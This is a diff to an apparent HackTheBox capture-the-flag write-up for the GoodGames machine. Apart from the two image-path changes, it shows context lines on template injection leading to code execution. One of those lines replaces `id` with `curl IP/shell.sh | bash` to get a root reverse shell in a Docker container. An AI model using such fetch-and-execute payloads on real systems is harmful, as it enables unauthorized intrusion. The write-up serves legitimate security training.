@@ -18,7 +18,7 @@ Take note of the `goodgames.htb` domain name.&#x20;
 
 The website is about some video games stuff:
 
-<figure><img src="../../../.gitbook/assets/image (23) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 In the corner of the page, there's a login available.
 
@@ -58,7 +58,7 @@ The SSTI also granted us RCE on the server with this payload:
 
 With this, we can replace the `id` command with a `curl IP/shell.sh | bash` payload to gain a reverse shell as root on this Docker Container.
 
-<figure><img src="../../../.gitbook/assets/image (22) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Docker Escape
 
